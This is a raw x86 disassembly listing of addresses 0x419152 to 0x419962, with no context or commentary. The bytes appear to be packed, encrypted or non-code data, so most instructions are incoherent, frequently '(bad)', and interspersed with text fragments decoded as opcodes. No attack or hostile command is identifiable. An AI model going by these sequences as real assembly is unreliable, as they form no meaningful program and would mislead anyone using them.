  419152:	push   DWORD PTR [ecx+ebp*8-0x8f95]
  419159:	mov    ebx,0x876412dd
  41915e:	adc    eax,0xf43c23ca
  419163:	push   esi
  419164:	adc    cl,ch
  419166:	jecxz  0x419130
  419168:	dec    edi
  419169:	mov    esi,0x7f911ff9
  41916e:	push   0xffffffa6
  419170:	repz les edx,FWORD PTR [edi-0x23a8060b]
  419177:	rcl    DWORD PTR [eax+eax*4],1
  41917a:	sbb    ebp,DWORD PTR [ebp-0x1]
  41917d:	dec    eax
  41917f:	xchg   edi,edi
  419181:	dec    DWORD PTR [esi]
  419183:	stos   DWORD PTR es:[edi],eax
  419184:	outs   dx,BYTE PTR ds:[esi]
  419185:	inc    DWORD PTR [esi+esi*4]
  419188:	jge    0x4191ed
  41918a:	adc    DWORD PTR cs:[edi],edx
  41918d:	fld    QWORD PTR [edi+ebp*8-0x2209db02]
  419194:	adc    DWORD PTR [bp-0x7585],esp
  419199:	or     ch,BYTE PTR [esi+eiz*8]
  41919c:	xchg   DWORD PTR [esi],edx
  41919e:	fiadd  WORD PTR [esp+eax*1]
  4191a1:	add    al,0x60
  4191a3:	in     eax,0x1e
  4191a5:	test   eax,0x336e4441
  4191aa:	mov    al,0xd
  4191ac:	or     eax,0x89f40605
  4191b1:	jl     0x41917c
  4191b3:	mov    cl,0x73
  4191b5:	dec    esp
  4191b6:	test   al,0x27
  4191b8:	inc    ebp
  4191b9:	test   DWORD PTR [ebx+ecx*4],esp
  4191bc:	pop    eax
  4191bd:	sbb    ah,ah
  4191bf:	add    al,0x4
  4191c1:	pop    ebp
  4191c2:	mov    ch,0xb7
  4191c4:	add    al,0x4
  4191c6:	add    al,0x4
  4191c8:	add    al,0x4
  4191ca:	add    al,0x4
  4191cc:	add    al,0x4
  4191ce:	add    al,0x4
  4191d0:	mov    WORD PTR [edi],fs
  4191d2:	xchg   BYTE PTR [ebp-0x72727273],cl
  4191d8:	lea    ecx,[ebp-0x74747273]
  4191de:	fist   WORD PTR [esi]
  4191e0:	pop    eax
  4191e1:	loopne 0x419180
  4191e3:	shl    BYTE PTR [ebx+ebp*1],1
  4191e6:	in     eax,dx
  4191e7:	(bad)  
  4191e8:	pop    esi
  4191e9:	jecxz  0x419268
  4191eb:	mov    edi,0xc23ad769
  4191f0:	and    al,0xf9
  4191f2:	xchg   ecx,eax
  4191f3:	dec    edi
  4191f4:	pop    ds
  4191f5:	imul   esp,DWORD PTR [eax],0x630a7365
  4191fb:	cmp    ah,BYTE PTR [ebp+0x6d]
  4191fe:	popa   
  4191ff:	jae    0x419266
  419201:	or     eax,0x70742e3c
  419206:	push   ebx
  419207:	jns    0x41926e
  419209:	bound  esp,QWORD PTR [esi+0x6e]
  41920c:	arpl   WORD PTR [ebp+0x65],bp
  41920f:	and    BYTE PTR [eax],ah
  419211:	imul   ebp,DWORD PTR [edi+0x6d],0x576f726f
  419218:	gs or  cl,BYTE PTR cs:[ebp+0x20]
  41921d:	jae    0x41928f
  41921f:	imul   esp,DWORD PTR [edx],0x6d696d0d
  419225:	je     0x419296
  419227:	jb     0x41928a
  419229:	ins    DWORD PTR es:[edi],dx
  41922a:	jb     0x419291
  41922c:	cmp    ah,BYTE PTR [ebp+0x6e]
  41922f:	gs data16 cs je 0x41929d
  419234:	jae    0x419258
  419236:	outs   dx,DWORD PTR ds:[esi]
  419237:	cs ins DWORD PTR es:[di],dx
  41923a:	das    
  41923b:	dec    ebp
  41923c:	jb     0x4192b0
  41923e:	and    ah,BYTE PTR [eax]
  419240:	jb     0x419219
  419242:	mov    ecx,DWORD PTR [ebx-0x74740400]
  419248:	lds    ebp,FWORD PTR ds:0xc77b8b8b
  41924e:	jg     0x4192a6
  419250:	ins    BYTE PTR es:[edi],dx
  419251:	leave  
  419252:	xlat   BYTE PTR ds:[ebx]
  419253:	pop    ds
  419254:	push   edi
  419255:	lods   al,BYTE PTR ds:[esi]
  419256:	pop    edx
  419257:	pushf  
  419258:	inc    ebp
  419259:	aam    0xee
  41925b:	adc    BYTE PTR [esi],bl
  41925d:	outs   dx,DWORD PTR ds:[esi]
  41925e:	dec    esi
  41925f:	(bad)  
  419260:	ficom  WORD PTR [esi+0x25]
  419263:	xchg   DWORD PTR [ebx-0x79361873],ecx
  419269:	out    dx,al
  41926a:	lea    ecx,[ebp-0x248ef973]
  419270:	fs xchg esi,eax
  419272:	pop    eax
  419273:	jns    0x41921a
  419275:	mov    eax,DWORD PTR [ecx]
  419277:	scas   al,BYTE PTR es:[edi]
  419278:	mov    eax,0x3bbb10a1
  41927d:	jg     0x41921d
  41927f:	(bad)  
  419280:	(bad)  
  419281:	dec    edi
  419282:	das    
  419283:	fcom   st(3)
  419285:	test   BYTE PTR [ebp-0x6c],0xa8
  419289:	sbb    BYTE PTR [ebx],ch
  41928b:	adc    eax,0xdf18a5da
  419290:	lea    ecx,[ebp-0x72723ba1]
  419296:	lea    eax,[ebp+0x45]
  419299:	inc    ebp
  41929a:	inc    ebp
  41929b:	inc    ebp
  41929c:	inc    ebp
  41929d:	inc    ebp
  41929e:	inc    ebp
  41929f:	inc    ebp
  4192a0:	loope  0x4192e3
  4192a2:	out    dx,eax
	...
  4192ab:	add    BYTE PTR [eax],al
  4192ad:	add    BYTE PTR [esi+ebx*4],dh
  4192b0:	jg     0x41929d
  4192b2:	imul   ebx,DWORD PTR [edi-0x5a],0xffffffbe
  4192b6:	add    dh,BYTE PTR [edi]
  4192b8:	(bad)  
  4192b9:	loopne 0x4192df
  4192bb:	adc    esi,edi
  4192bd:	rcr    DWORD PTR [ecx-0x70ac99c0],cl
  4192c3:	jne    0x41926b
  4192c5:	xlat   BYTE PTR ds:[ebx]
  4192c6:	add    BYTE PTR [eax],al
  4192c8:	ret    0xd5b2
  4192cb:	jmp    0xa0af:0x98cb6b71
  4192d2:	xor    eax,DWORD PTR [esi]
  4192d4:	or     ebx,DWORD PTR [esi]
  4192d6:	mov    edi,0x99901eb9
  4192db:	mov    ds:0xd3b7cff2,eax
  4192e0:	inc    esp
  4192e1:	xor    BYTE PTR [ecx],ch
  4192e3:	inc    esi
  4192e4:	adc    al,0x0
  4192e6:	add    BYTE PTR [ebx+esi*8+0x75],dh
  4192ea:	add    BYTE PTR [eax],al
  4192ec:	into   
  4192ed:	imul   ecx,DWORD PTR [edi-0x7407fc00],0x129e784f
  4192f7:	push   cs
  4192f8:	jp     0x419297
  4192fa:	and    ebx,edi
  4192fc:	je     0x41929b
  4192fe:	mov    bh,BYTE PTR [esi]
  419300:	sbb    cl,bh
  419302:	mov    eax,0xdad7eae0
  419307:	push   0x51
  419309:	add    al,0x4
  41930b:	add    al,0x20
  41930d:	scas   eax,DWORD PTR es:[edi]
  41930e:	add    al,0x4
  419310:	jle    0x419386
  419312:	add    al,0x4
  419314:	add    al,0xff
  419316:	(bad)  
  419317:	(bad)  
  419318:	(bad)  
  419319:	(bad)  
  41931a:	(bad)  
  41931b:	(bad)  
  41931c:	(bad)  
  41931d:	call   FWORD PTR [ebp+0x23c895d8]
  419323:	lods   al,BYTE PTR ds:[esi]
  419324:	outs   dx,DWORD PTR ds:[esi]
  419325:	inc    ecx
  419326:	mov    BYTE PTR [edx+0x6d],dl
  419329:	or     al,ah
  41932b:	mov    eax,ds:0x721cff2b
  419330:	pushf  
  419331:	jp     0x4192ed
  419333:	or     DWORD PTR [ecx+0x20],esp
	...
  41933e:	add    BYTE PTR [eax],al
  419340:	add    BYTE PTR [esi+0x8e6c46],cl
  419346:	add    dh,bl
  419348:	fdiv   QWORD PTR [ecx]
  41934a:	imul   edi,DWORD PTR [ebx-0x4611ced0],0x66
  419351:	leave  
  419352:	push   0xffffff93
  419354:	jne    0x419318
  419356:	pusha  
  419357:	ds test al,0x14
  41935a:	retf   0x2f51
  41935d:	sbb    esi,ebx
  41935f:	out    dx,al
  419360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419361:	test   BYTE PTR ds:0x93b204fb,dl
  419367:	cmp    BYTE PTR ds:0xf7000079,dh
  41936d:	rol    BYTE PTR [eax],cl
  41936f:	add    BYTE PTR [edi+ecx*8+0x710c008e],dh
  419376:	es jmp 0x2d643225
  41937c:	pop    es
  41937d:	std    
  41937e:	lds    esi,FWORD PTR [edi-0x12]
  419381:	jp     0x4193a7
  419383:	mov    ebx,DWORD PTR [eax]
  419385:	or     DWORD PTR [ebx-0x5f822b34],esp
  41938b:	repnz std 
  41938d:	or     al,0xc
  41938f:	or     al,0x3
  419391:	add    eax,0x98ea046f
  419396:	xor    al,0x14
  419398:	pop    esi
  419399:	ins    DWORD PTR es:[edi],dx
  41939a:	aaa    
  41939b:	aam    0x4
  41939d:	pop    eax
  41939e:	(bad)  
  41939f:	gs (bad) 
  4193a2:	fdivr  QWORD PTR [ecx+edi*2+0xd5214fe]
  4193a9:	push   cs
  4193aa:	mov    ebx,0xc0c5c20
  4193af:	fpatan 
  4193b1:	mov    ebp,0xff0c0c0c
  4193b6:	(bad)  
  4193b7:	(bad)  
  4193b8:	(bad)  
  4193b9:	(bad)  
  4193ba:	(bad)  
  4193bb:	(bad)  
  4193bc:	(bad)  
  4193bd:	(bad)  
  4193be:	mov    ebp,0x45452057
  4193c3:	inc    ebp
  4193c4:	inc    ebp
  4193c5:	inc    ebp
  4193c6:	inc    ebp
  4193c7:	inc    ebp
  4193c8:	inc    ebp
  4193c9:	inc    ebp
  4193ca:	lea    ecx,[ebp-0x78364ead]
  4193d0:	nop
  4193d1:	xchg   esi,eax
  4193d2:	mov    ds:0xc08f1d91,al
  4193d7:	add    al,0xc6
  4193d9:	gs push ds
  4193db:	(bad)  
  4193dc:	push   0x7d
  4193de:	mov    eax,0x83ee298b
  4193e3:	les    ecx,FWORD PTR [ebp-0x72a5bf73]
  4193e9:	lea    edx,[edx+0xd]
  4193ec:	lea    ecx,[ebp+0x1c2e64c7]
  4193f2:	dec    ebx
  4193f3:	jl     0x41940b
  4193f5:	ds push esp
  4193f7:	and    BYTE PTR [edx+0x59],bl
  4193fa:	pushf  
  4193fb:	pop    es
  4193fc:	push   0x1ce295ed
  419401:	clc    
  419402:	and    bh,0xbf
  419405:	xchg   edx,eax
  419406:	lea    ecx,[esp+ebp*8]
  419409:	and    esi,ebx
  41940b:	icebp  
  41940c:	or     al,0xc
  41940e:	or     al,0x14
  419410:	sub    BYTE PTR [edx],0x1
  419413:	pop    ebx
  419414:	arpl   WORD PTR [ebx+0x6389d60a],di
  41941a:	dec    ebx
  41941b:	lahf   
  41941c:	sti    
  41941d:	gs nop
  41941f:	mov    cl,0xa2
  419421:	pop    eax
  419422:	mov    esi,0x9149e469
  419427:	lock pop ds
  419429:	call   esp
  41942b:	mov    DWORD PTR [edx],eax
  41942d:	ds adc al,0x7c
  419430:	cmp    DWORD PTR [esp+ecx*1+0xc20ff0c],ebp
  419437:	or     al,0xc
	...
  419441:	add    ch,dl
  419443:	stos   DWORD PTR es:[edi],eax
  419444:	or     BYTE PTR [eax],al
	...
  41944e:	push   0x6a
  419450:	sub    esp,DWORD PTR [edx+0x7a]
  419453:	cwde   
  419454:	mov    ebp,0xb34a912f
  419459:	mov    ah,0x75
  41945b:	ins    DWORD PTR es:[edi],dx
  41945c:	sbb    al,BYTE PTR [edi-0x49]
  41945f:	pop    ds
  419460:	(bad)  
  419461:	pop    ebp
  419462:	sbb    BYTE PTR [ecx+0x1f],dl
  419465:	jmp    0x268c:0x6a6aa7c9
  41946c:	sub    eax,ebx
  41946e:	cmp    al,0xa
  419470:	adc    eax,0x6941f74e
  419475:	ins    DWORD PTR es:[edi],dx
  419476:	imul   esp,DWORD PTR [ebp+0x43],0x72650d65
  41947d:	push   0x74447353
  419482:	gs push ebx
  419484:	ds jo  0x4194e9
  419487:	ins    DWORD PTR es:[edi],dx
  419488:	ins    DWORD PTR es:[edi],dx
  419489:	and    BYTE PTR [ebx+0x65],ah
  41948c:	and    BYTE PTR [eax+0x72],ch
  41948f:	outs   dx,BYTE PTR ds:[esi]
  419490:	imul   ebp,DWORD PTR [esi],0x6d226d73
  419496:	jb     0x4194fa
  419498:	inc    ebx
  419499:	jo     0x4194d7
  41949b:	jb     0x41950b
  41949d:	push   eax
  41949e:	data16 jbe 0x419502
  4194a1:	imul   ecx,DWORD PTR [edx],0x2062656f
  4194a7:	outs   dx,BYTE PTR ds:[esi]
  4194a8:	je     0x41950f
  4194aa:	and    cl,BYTE PTR [edx]
  4194ac:	and    BYTE PTR [eax],ah
  4194ae:	jbe    0x4194fd
  4194b0:	outs   dx,DWORD PTR ds:[esi]
  4194b1:	jae    0x419520
  4194b3:	jae    0x4194d5
  4194b5:	push   0x74527262
  4194ba:	or     eax,0x6d746628
  4194bf:	imul   esi,DWORD PTR cs:[ebx+0x20],0x7962736d
  4194c7:	aas    
  4194c8:	jae    0x41952c
  4194ca:	sbb    ch,cl
  4194cc:	bound  edi,QWORD PTR [ecx+0x1e]
  4194cf:	push   ebx
  4194d0:	inc    esp
  4194d1:	ja     0x41952e
  4194d3:	jns    0x419490
  4194d5:	fnstenv [ebp+0x6ac02a2e]
  4194db:	push   0x41
  4194dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194de:	enter  0x6a6a,0x4e
  4194e2:	jl     0x4194a7
  4194e4:	push   0xffffff8b
  4194e6:	loope  0x41953b
  4194e8:	dec    esi
  4194e9:	push   edi
  4194ea:	xor    al,0xb3
  4194ec:	jg     0x4194cf
  4194ee:	or     bl,BYTE PTR [esi+0x2e75ad56]
  4194f4:	fcom   DWORD PTR [ebp+edx*8-0x2d]
  4194f8:	xor    eax,0xae743481
  4194fd:	add    eax,0x238b8b8b
  419502:	test   eax,0xc28d8b8b
  419507:	mov    ecx,DWORD PTR [ebx+0x8b]
  41950d:	add    BYTE PTR [eax],al
  41950f:	add    BYTE PTR [eax],al
  419511:	add    BYTE PTR [eax],al
  419513:	mov    ebx,DWORD PTR [edi+0x7f3295c2]
  419519:	mov    ebx,0x891a19c0
  41951e:	push   cs
  41951f:	xor    DWORD PTR [edx-0x6b],edi
  419522:	shl    BYTE PTR [edx+eax*2+0x5b],cl
  419526:	lods   al,BYTE PTR ds:[esi]
  419527:	mov    BYTE PTR [edx+0xc9b2],bh
	...
  419535:	add    BYTE PTR [eax+0x35],cl
  419538:	fnstsw WORD PTR [edx-0x5f740000]
  41953e:	pop    es
  41953f:	aam    0x8a
  419541:	cmp    ebp,DWORD PTR [edx+ecx*1]
  419544:	fwait
  419545:	xor    eax,0x2168bf9c
  41954a:	adc    eax,0x46c71bff
  41954f:	call   0x8027856b
  419554:	cmovnp esi,edx
  419557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419558:	enter  0x36dd,0x42
  41955c:	ror    DWORD PTR [edi-0x70ffff26],0x28
  419563:	add    BYTE PTR [eax],al
  419565:	adc    al,0x5c
  419567:	out    dx,al
  419568:	add    BYTE PTR [edi+edx*8],al
  41956b:	or     al,0x4d
  41956d:	mov    DWORD PTR [edi-0x7240806b],ecx
  419573:	xor    BYTE PTR [ecx+0x76dc1745],0xf5
  41957a:	sub    edi,DWORD PTR [ebx-0x4edb3772]
  419580:	iret   
  419581:	ret    0x404
  419584:	add    al,0x55
  419586:	daa    
  419587:	retf   
  419588:	push   ecx
  419589:	cmp    BYTE PTR [esi-0x38],ch
  41958c:	(bad)  
  41958d:	js     0x4195fb
  41958f:	lea    ebx,[eax-0x1c]
  419592:	sub    eax,0x53fbfa04
  419597:	jg     0x41957e
  419599:	add    esp,edx
  41959b:	sub    eax,0x5eaa876e
  4195a0:	jo     0x41959e
  4195a2:	add    al,0x4
  4195a4:	test   eax,0x404563a
  4195a9:	add    al,0x0
	...
  4195b3:	pusha  
  4195b4:	push   ss
  4195b5:	pop    ecx
  4195b6:	or     al,0xc
  4195b8:	or     al,0xc
  4195ba:	or     al,0xc
  4195bc:	or     al,0xc
  4195be:	or     al,0x0
  4195c0:	add    BYTE PTR [edi],dh
  4195c2:	jbe    0x4195ef
  4195c4:	in     eax,0x7f
  4195c6:	scas   al,BYTE PTR es:[edi]
  4195c7:	loope  0x419643
  4195c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195ca:	sbb    BYTE PTR [ebp-0x1733f9d],cl
  4195d0:	jp     0x419592
  4195d2:	jle    0x419564
  4195d4:	(bad)  
  4195d6:	loope  0x419603
  4195d8:	inc    edx
  4195d9:	add    BYTE PTR [eax],al
  4195db:	pushf  
  4195dc:	push   cs
  4195dd:	add    BYTE PTR [eax],al
  4195df:	repnz lods eax,DWORD PTR ds:[esi]
  4195e1:	add    BYTE PTR [eax],al
  4195e3:	fdivr  QWORD PTR [ebx+ebx*8-0x651b41af]
  4195ea:	adc    DWORD PTR [ebp-0x79db0d33],ecx
  4195f0:	ret    0x6734
  4195f3:	sub    edx,DWORD PTR ds:0x7b651ad8
  4195f9:	xchg   ebx,eax
  4195fa:	adc    BYTE PTR [eax],al
  4195fc:	lea    ecx,[esi+edx*1+0x5]
  419600:	push   edx
  419601:	lea    ecx,[ebp+0x69d4758d]
  419607:	xchg   BYTE PTR [edi+0x52],ch
  41960a:	aad    0xa6
  41960c:	popf   
  41960d:	mov    ecx,0x3bdde251
  419613:	mov    ds:0xa3ac3cb,al
  419618:	and    al,0x81
  41961a:	test   al,0x1d
  41961c:	mov    esp,0xa86bd9e
  419621:	xor    DWORD PTR [esi+0x6a0649a4],0xf6938d8d
  41962b:	lea    ecx,[ebp-0x72727273]
  419631:	lea    ecx,[ebp-0x72727273]
  419637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419638:	popa   
  419639:	add    BYTE PTR [eax],0x0
  41963c:	add    BYTE PTR [eax],al
  41963e:	add    BYTE PTR [eax],al
  419640:	add    BYTE PTR [eax],al
  419642:	add    BYTE PTR [ebp-0x23897d73],cl
  419648:	enter  0xb8d9,0xd7
  41964c:	aas    
  41964d:	jge    0x4196a1
  41964f:	pop    ss
  419650:	pop    ebp
  419651:	loope  0x4195da
  419653:	push   ebp
  419654:	out    dx,eax
  419655:	sub    DWORD PTR [esi+edx*2-0x3cfc6c9d],esi
  41965c:	jns    0x4195eb
  41965e:	lea    eax,[ecx+0x121d8a0a]
  419664:	xchg   edi,eax
  419665:	jmp    0x6f2f1f67
  41966a:	out    0xa1,al
  41966c:	cld    
  41966d:	int3   
  41966e:	in     al,0x53
  419670:	shr    DWORD PTR [ecx+edi*1],0xb4
  419674:	mov    eax,0xdbd11e83
  419679:	cmc    
  41967a:	sbb    al,BYTE PTR [edi]
  41967c:	lea    ecx,[ebp-0x72bc415d]
  419682:	lea    ebx,[edi]
  419684:	(bad)  
  419685:	das    
  419686:	lea    esi,[ebp-0x78]
  419689:	sub    DWORD PTR [esp+ecx*2+0x65],edi
  41968d:	xchg   edx,eax
  41968e:	test   al,0x15
  419690:	aaa    
  419691:	sub    DWORD PTR [edi+eax*2-0x14148de2],edi
  419698:	or     esp,DWORD PTR [eax]
  41969a:	pushf  
  41969b:	mov    esp,0x25fda61e
  4196a0:	jne    0x419717
  4196a2:	jne    0x41966d
  4196a4:	pop    es
  4196a5:	jne    0x41971c
  4196a7:	xor    DWORD PTR [eax],edx
  4196a9:	jne    0x419720
  4196ab:	jne    0x419721
  4196ad:	je     0x419723
  4196af:	je     0x419725
  4196b1:	je     0x419727
  4196b3:	je     0x419729
  4196b5:	dec    ebx
  4196b6:	rdpmc  
  4196b8:	rcr    cl,cl
  4196ba:	popf   
  4196bb:	jmp    FWORD PTR [ebp-0x3a5aade0]
  4196c1:	cmp    eax,edi
  4196c3:	std    
  4196c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196c5:	or     ebx,DWORD PTR [edi]
  4196c7:	xor    ebp,DWORD PTR [eax]
  4196c9:	gs mov bh,0x96
  4196cc:	sub    edi,edi
  4196ce:	(bad)  
  4196cf:	(bad)  
  4196d0:	(bad)  
  4196d1:	(bad)  
  4196d2:	(bad)  
  4196d3:	(bad)  
  4196d4:	(bad)  
  4196d5:	push   DWORD PTR [esp+esi*2-0x7e]
  4196d9:	(bad)  
  4196da:	das    
  4196db:	data16 je 0x419752
  4196de:	fldenv [ecx-0x50]
  4196e1:	mov    bh,0x75
  4196e3:	xlat   BYTE PTR ds:[ebx]
  4196e4:	stc    
  4196e5:	imul   ebp,DWORD PTR [ecx-0x3b46842f],0x2e43a8e7
  4196ef:	std    
  4196f0:	fisttp WORD PTR [ebx+0x2e]
  4196f3:	sbb    DWORD PTR [eax-0x220477c4],ebp
  4196f9:	dec    ecx
  4196fa:	jo     0x41975b
  4196fc:	jbe    0x419775
  4196fe:	sub    dl,BYTE PTR [ecx-0x508b8b03]
  419704:	xchg   edi,eax
  419705:	je     0x41977b
  419707:	push   0xff74fd24
  41970c:	xchg   ecx,eax
  41970d:	ins    BYTE PTR es:[edi],dx
  41970e:	sahf   
  41970f:	add    ah,BYTE PTR [ebp+0x5f]
  419712:	or     ecx,DWORD PTR [esi-0x71]
  419715:	pushf  
  419716:	dec    ebx
  419717:	jmp    0x686796f
  41971c:	or     ebx,DWORD PTR [edx-0x23]
  41971f:	push   ebx
  419720:	cld    
  419721:	jle    0x41977a
  419723:	cs cs sub DWORD PTR gs:[edi+0x68],ebp
  419729:	jae    0x41974b
  41972b:	jb     0x419790
  41972d:	ins    DWORD PTR es:[edi],dx
  41972e:	jae    0x41979f
  419730:	ins    DWORD PTR es:[edi],dx
  419731:	gs je  0x419754
  419734:	imul   esi,DWORD PTR [ebx+0x69],0x6f652020
  41973b:	cmp    al,0x3c
  41973d:	gs ins DWORD PTR es:[edi],dx
  41973f:	and    BYTE PTR [eax+0x62],dh
  419742:	imul   ebp,DWORD PTR cs:[ebp+0x2e],0x2e725772
  41974a:	or     ah,BYTE PTR [ebx+0x65]
  41974d:	je     0x419793
  41974f:	gs cs inc ebx
  419752:	cs bound esp,QWORD PTR gs:[ebx+0x72]
  419757:	jns    0x4197be
  419759:	ins    DWORD PTR es:[edi],dx
  41975a:	cmp    al,0x20
  41975c:	outs   dx,BYTE PTR ds:[esi]
  41975d:	das    
  41975e:	ds gs jo 0x4197c7
  419762:	jae    0x4197d6
  419764:	imul   esi,DWORD PTR [esp+eiz*2+0x70],0x72727253
  41976c:	cs dec esi
  41976e:	cs ds je 0x4197ac
  419772:	je     0x4197e4
  419774:	imul   esp,DWORD PTR [ebx+0x2e],0x6f6f3e72
  41977b:	outs   dx,DWORD PTR ds:[esi]
  41977c:	jb     0x41973c
  41977e:	xor    eax,0xffffffff
  419783:	jg     0x4197d7
  419785:	(bad)  
  419786:	ds mov dl,0x10
  419789:	sbb    dh,BYTE PTR [ebp+ecx*1+0x4e]
  41978d:	xor    bl,BYTE PTR [edi+edi*1+0x5cecdeb6]
  419794:	push   eax
  419795:	sbb    eax,0xbfd8ec92
  41979a:	sahf   
  41979b:	test   eax,0xffffe9a8
  4197a0:	(bad)  
  4197a1:	fiadd  WORD PTR [eax]
  4197a3:	mov    edi,edi
  4197a5:	(bad)  
  4197a6:	push   DWORD PTR [ebp+0x75]
  4197a9:	jne    0x419820
  4197ab:	jne    0x419822
  4197ad:	jne    0x419824
  4197af:	jne    0x419799
  4197b1:	add    ebp,edi
	...
  4197bb:	add    ah,cl
  4197bd:	int3   
  4197be:	push   ss
  4197bf:	cmp    dh,al
  4197c1:	inc    ebp
  4197c2:	sti    
  4197c3:	fbld   TBYTE PTR [ebp-0x58]
  4197c6:	pusha  
  4197c7:	adc    BYTE PTR ds:0xe735150a,bl
  4197cd:	and    al,0x0
  4197cf:	stc    
  4197d0:	int3   
  4197d1:	mov    cl,0x8a
  4197d3:	jb     0x419792
  4197d5:	mov    dl,0xcc
  4197d7:	int3   
  4197d8:	jo     0x4197c1
  4197da:	int3   
  4197db:	int3   
  4197dc:	sbb    bl,bh
  4197de:	int3   
  4197df:	int3   
  4197e0:	push   edi
  4197e1:	popa   
  4197e2:	xor    eax,0xa0f76f7e
  4197e7:	fimul  WORD PTR [edi+eiz*4]
  4197ea:	jns    0x419823
  4197ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197ed:	push   edi
  4197ee:	cwde   
  4197ef:	mov    ch,0x34
  4197f1:	retf   
  4197f2:	xor    dh,dh
  4197f4:	or     BYTE PTR [eax+0x72],ah
  4197f7:	int    0xcc
  4197f9:	lea    ebp,[esi-0x1d]
  4197fc:	out    0x67,eax
  4197fe:	lea    ecx,[ebp+0x66b95b8d]
  419804:	cld    
  419805:	cld    
  419806:	outs   dx,BYTE PTR ds:[esi]
  419807:	push   ebx
  419808:	and    DWORD PTR [ebx+0x36],eax
  41980b:	and    BYTE PTR [esi-0x4afff8d4],dl
  419811:	mov    edi,0x8701efca
  419816:	mov    edi,0xa30bcdec
  41981b:	lods   al,BYTE PTR ds:[esi]
  41981c:	retf   
  41981d:	sahf   
  41981e:	cld    
  41981f:	push   ebx
  419820:	xchg   esp,eax
  419821:	(bad)  
  419822:	fidiv  WORD PTR [esi-0x336b7273]
  419828:	lea    ecx,[ebp+0x8d]
  41982e:	add    BYTE PTR [eax],al
  419830:	add    BYTE PTR [eax],al
  419832:	add    BYTE PTR [eax],al
  419834:	mov    dh,0x42
  419836:	push   ds
  419837:	push   0x6a
  419839:	push   0x6a
  41983b:	push   0x6a
  41983d:	push   0x6a
  41983f:	push   0xffffffff
  419841:	jmp    FWORD PTR [ecx]
  419843:	lahf   
  419844:	pop    ecx
  419845:	lahf   
  419846:	add    eax,0x31f84bff
  41984b:	push   ds
  41984c:	and    DWORD PTR es:[edx],ecx
  41984f:	ins    BYTE PTR es:[edi],dx
  419850:	data16 mov dl,0x36
  419853:	clc    
  419854:	cmp    BYTE PTR [edi-0x7d],dl
  419857:	and    esi,edx
  419859:	add    edi,edi
  41985b:	inc    DWORD PTR [ecx-0x69]
  41985e:	gs xchg esp,eax
  419860:	and    ch,BYTE PTR [edi+0xa8e0071]
  419866:	or     edx,0x1e
  419869:	mov    ebx,0xb475d076
  41986e:	jge    0x419853
  419870:	into   
  419871:	jbe    0x4198a2
  419873:	mov    ah,0x7d
  419875:	or     al,BYTE PTR [esp+ebx*2+0x39]
  419879:	(bad)  
  41987a:	push   DWORD PTR [ebx]
  41987c:	and    DWORD PTR [ebx],0xffffffff
  41987f:	(bad)  
  419880:	call   FWORD PTR [ebx]
  419882:	xchg   ebp,eax
  419883:	inc    DWORD PTR [eax]
  419885:	mov    edi,0x6e94fbb1
  41988a:	push   ebp
  41988b:	adc    eax,0xb69b770c
  419890:	mov    dh,0xa8
  419892:	pusha  
  419893:	jg     0x41983f
  419895:	dec    esp
  419896:	loope  0x419818
  419898:	cmp    eax,0x14010160
  41989d:	add    BYTE PTR [eax],al
  41989f:	add    BYTE PTR [esi+ecx*1+0x0],cl
  4198a3:	add    BYTE PTR [edi+0x44],bl
  4198a6:	add    BYTE PTR [eax],al
  4198a8:	add    BYTE PTR [ebx-0x74747475],cl
  4198ae:	mov    ecx,DWORD PTR [ebx+0x16258b8b]
  4198b4:	mov    edi,DWORD PTR [eax-0x30b85b84]
  4198ba:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4198bc:	mov    ?,WORD PTR ds:0x97396601
  4198c2:	les    ecx,FWORD PTR [eax+0x1697da9a]
  4198c8:	pop    ecx
  4198c9:	fimul  DWORD PTR [ebp-0x72727273]
  4198cf:	lea    ecx,[ebp+0x8d8d]
  4198d5:	push   eax
  4198d6:	leave  
  4198d7:	mov    eax,ds:0x4e000090
  4198dc:	xchg   BYTE PTR [ebx-0x11],bl
  4198df:	in     eax,dx
  4198e0:	sbb    al,0x7e
  4198e2:	xchg   edi,eax
  4198e3:	cmp    DWORD PTR [ebx+0x5d5a0adf],eax
  4198e9:	cmp    ebx,DWORD PTR [ecx+edx*4-0x26]
  4198ed:	in     eax,0xe9
  4198ef:	inc    ecx
  4198f0:	inc    edx
  4198f1:	mov    BYTE PTR [edi-0x4],bl
  4198f4:	dec    edx
  4198f5:	enter  0xae5b,0xe
  4198f9:	xchg   edi,eax
  4198fa:	push   cs
  4198fb:	push   esi
  4198fc:	push   edi
  4198fd:	pop    esp
  4198fe:	add    BYTE PTR [eax],al
  419900:	test   DWORD PTR [ecx+0x0],ecx
  419903:	add    bh,dh
  419905:	push   edx
  419906:	loope  0x419908
  419908:	add    BYTE PTR [ebp-0x1e],ch
  41990b:	mov    bh,0xe4
  41990d:	xchg   BYTE PTR [edx-0x5fd6a9cb],ah
  419913:	rcl    DWORD PTR [ebx+0x2a012aa7],0xab
  41991a:	xor    BYTE PTR [edi],bh
  41991c:	repz pop ebx
  41991e:	sub    eax,ebx
  419920:	mov    esi,0x49000000
  419925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419926:	add    bl,BYTE PTR [ebx]
  419928:	mov    ebp,0xbf0dd583
  41992d:	jle    0x419908
  41992f:	jp     0x41996f
  419931:	jecxz  0x419961
  419933:	fisubr WORD PTR [edx]
  419936:	popa   
  419937:	js     0x419950
  419939:	push   esi
  41993a:	mov    ah,0x66
  41993c:	add    BYTE PTR [ecx],dh
  41993e:	call   0xbdb0:0x98ac
  419945:	mov    al,BYTE PTR [eax]
  419947:	add    BYTE PTR [eax],al
  419949:	(bad)  
  41994a:	(bad)  
  41994b:	(bad)  
  41994c:	(bad)  
  41994d:	(bad)  
  41994e:	(bad)  
  41994f:	(bad)  
  419950:	(bad)  
  419951:	jmp    esp
  419953:	add    BYTE PTR [eax+eax*1+0x0],cl
  419957:	add    BYTE PTR [eax],al
  419959:	add    BYTE PTR [eax],al
  41995b:	add    BYTE PTR [eax],al
  41995d:	add    bh,bh
  41995f:	inc    edx
  419961:	inc    esi
  419962:	sbb    eax,DWORD PTR [edx-0xa]
